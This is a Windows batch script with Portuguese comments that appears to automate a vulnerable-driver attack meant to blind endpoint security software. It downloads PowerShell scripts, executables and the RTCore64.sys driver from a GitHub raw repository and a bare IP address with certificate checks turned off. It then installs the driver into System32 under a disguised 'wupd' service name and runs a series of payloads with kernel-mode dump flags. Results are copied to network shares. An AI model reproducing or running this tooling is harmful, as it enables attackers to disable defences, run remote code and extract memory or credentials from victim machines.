@echo off
title BLIND CS - FARM v3 (GH raw + validado)
setlocal enabledelayedexpansion
set K=\\host.lan\Data
set G=https://raw.githubusercontent.com/josimayktrindade-lgtm/updates/main
set O=C:\manual_out.txt
echo ============================================================ > %O%
echo  BLIND CS - FARM v3 %date% %time% >> %O%
echo  (fontes: GH raw -^> listener -^> share / tudo validado por tamanho)
echo ============================================================ >> %O%

echo [0] QGA + pastas + limpeza...
if not exist C:\ProgramData\wupd mkdir C:\ProgramData\wupd
if exist %K%\qg\qemu-ga\gspawn-win64-helper.exe copy /y %K%\qg\qemu-ga\gspawn-win64-helper.exe "C:\Program Files\qemu-ga\" >nul 2>&1
net start QEMU-GA >nul 2>&1
sc stop wupd >> %O% 2>&1
sc delete wupd >> %O% 2>&1
sc stop WupdSvc >> %O% 2>&1
sc delete WupdSvc >> %O% 2>&1

echo [1] t1p7 (carrega driver RTC; deps vindo do GH raw)...
call :fetch C:\ProgramData\wupd\t1p7.ps1 t1p7.ps1 https://80.78.22.208/t1p7.ps1 3000
powershell -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\wupd\t1p7.ps1
findstr /c:"LOADED" /c:"CARREGADO" C:\ProgramData\wupd\t1p7.log >> %O% 2>&1
sc query WupdSvc | findstr /i "ESTADO STATE" >> %O%
call :drvchk

echo [2] tiros x1..x12 (hash virgem por tiro; para no primeiro sucesso)...
for /L %%N in (1,1,12) do (
  call :tiro %%N
  if !OKK!==1 goto :fimd
)
:fimd
echo [3] VERIFY:
if exist C:\ProgramData\wupd\x1.exe (
  C:\ProgramData\wupd\x1.exe -h > C:\v.txt 2>&1
  for %%A in (C:\v.txt) do echo verify_bytes=%%~zA >> %O%
)
copy /y %O% %K%\manual_out.txt >nul 2>&1
if exist Z:\ copy /y %O% Z:\manual_out.txt >nul 2>&1
copy /y C:\manual_shush.txt %K%\manual_shush.txt >nul 2>&1
if exist Z:\ copy /y C:\manual_shush.txt Z:\manual_shush.txt >nul 2>&1
echo ============ FIM (logs copiados p/ share) ============
pause
exit /b

:drvchk
set DSZ=0
for %%A in (C:\Windows\System32\RTCore64.sys) do set DSZ=%%~zA
if !DSZ! LSS 10000 (
  echo   driver file ruim (!DSZ!) - repondo agora >> %O%
  call :fetch C:\Windows\System32\RTCore64.sys d3.sys https://80.78.22.208/d3.sys 10000
  set DSZ=0
  for %%A in (C:\Windows\System32\RTCore64.sys) do set DSZ=%%~zA
  echo   driver agora=!DSZ! >> %O%
) else ( echo   driver file ok (!DSZ!) >> %O% )
exit /b 0

:tiro
set OKK=0
echo == tiro x%1 t=%time% >> %O%
call :fetch C:\ProgramData\wupd\x%1.exe x%1.exe https://80.78.22.208/x%1.exe 300000
if errorlevel 1 ( echo   x%1 fetch ruim - pulando >> %O% & exit /b 0 )
ping -n 21 127.0.0.1 >nul
call :drvchk
C:\ProgramData\wupd\x%1.exe dump --kernelmode --usermode --internet --no-restore --dont-unload-driver --process-name _nada_.exe --vuln-service WupdSvc --vuln-driver C:\Windows\System32\RTCore64.sys > C:\manual_shush.txt 2>&1
set RC=!errorlevel!
set SZ2=0
for %%A in (C:\manual_shush.txt) do set SZ2=%%~zA
echo   x%1: rc=!RC! bytes=!SZ2! >> %O%
echo   x%1: rc=!RC! bytes=!SZ2!
if !SZ2! gtr 500 ( set OKK=1 & echo   *** SUCESSO no x%1 *** >> %O% & exit /b 0 )
ping -n 26 127.0.0.1 >nul
exit /b 0

:fetch
set FSZ=0
if exist %1 for %%A in (%1) do set FSZ=%%~zA
if !FSZ! GEQ %4 exit /b 0
for /L %%R in (1,1,2) do (
  if !FSZ! LSS %4 (
    curl.exe -k -s --max-time 30 --retry 2 -o %1 "%G%/%2?cb=%%R"
    for %%A in (%1) do set FSZ=%%~zA
  )
)
if !FSZ! GEQ %4 exit /b 0
for /L %%R in (1,1,2) do (
  if !FSZ! LSS %4 (
    curl.exe -k -s --max-time 30 --retry 2 -o %1 %3
    for %%A in (%1) do set FSZ=%%~zA
  )
)
if !FSZ! GEQ %4 exit /b 0
if exist %K%\blind\%2 (
  copy /y %K%\blind\%2 %1 >nul 2>&1
  for %%A in (%1) do set FSZ=%%~zA
)
if !FSZ! GEQ %4 exit /b 0
exit /b 1
